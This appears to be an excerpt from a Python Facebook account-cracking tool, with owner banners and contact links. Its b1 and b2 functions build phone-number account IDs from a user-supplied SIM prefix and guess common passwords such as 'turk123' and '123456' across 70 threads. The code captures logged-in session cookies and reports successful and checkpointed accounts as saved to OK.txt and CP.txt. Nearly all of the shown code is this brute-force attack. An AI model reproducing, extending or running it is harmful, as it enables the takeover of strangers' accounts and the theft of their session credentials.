...
os.system('xdg-open http://wa.me/+905369966010')
...
──────────────────────────────────────────────    
\33[1;37m----------------------------------------------
→  OWNER      :  𝕃𝕆𝕐 𝕌ℤ𝔹𝔼𝕂 𝔹𝔸ℂℍ𝔸
→ FACEBOOK    :  𝕊ℍ𝔸ℍℤ𝔸𝔻𝔸 ℚ𝕌𝕋𝔹𝕌𝔻𝔻𝕀ℕ 
→   GITHUB        :  𝕌ℤ𝔹𝔼𝕂-𝔹𝔸ℂℍ𝔸
→   TOOLS     :  ℝ𝔸ℕ𝔻𝕆𝕄 
...
def riaz():
	...
	if riaz1 =='5':
		riaz()
	if riaz1 =='4':
		os.system('xdg-open http://wa.me/+905369966010text=SN.JAN💜🐰Sir😪💕')
	if riaz1 =='3':
		os.system('xdg-open https://www.facebook.com/profile.php?id=661450917');riaz()
	if riaz1 =='2':
		bangla()
	else:
...
def bangla():
	os.system('clear')
	print(logo)
	print('[1] TURK \x1b[1;92mM 1')
	print('\x1b[1;97m[2] AFG \x1b[1;92mM 1')
...
def b1():
    ...
    os.system('clear')
    print(logo)
    print('[+] Example  : 9055,90534,90538,****Etc')
    print('\x1b[1;91m[+] See Note : Use Your Sim Code ')
    lines()
    kode = input('[+] Your Code : ')
    lines()
    ...
    with ThreadPool(max_workers=70) as yaari:
        ...
        for guru in user:
            uid = kode+guru
            pwx=[guru,kode,'turkiye','turk123','kurt123','konya123','123456']
            yaari.submit(rcrack,uid,pwx,tl)
    print(46*'-')
    print('IDZ SAVED IN OK.txt : CP.txt')
    print(46*'-')
...
def b2():
    ...
    os.system('clear')
    print(logo)
    print('[+] Example  : 90553,90534,90538,****Etc')
    print('\x1b[1;91m[+] See Note : Use Your Sim Code ')
    lines()
    kode = input('[+] Your Code : ')
    lines()
    ...
    with ThreadPool(max_workers=70) as yaari:
        ...
        for guru in user:
            uid = kode+guru
            pwx=[guru,'MALIK123','turkiye','turk123','kurt123','konya12345','123456','Ahmet123']
            yaari.submit(rcrack,uid,pwx,tl)
    print(46*'-')
    print('IDZ SAVED IN OK.txt : CP.txt')
    print(46*'-')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;31m[OMAR-CP] '+uid+' | '+ps+'\x1b[1;97m')
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mUZBEK-BACHA\033[1;97m] %s|\33[1;32mOK:- %s \r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
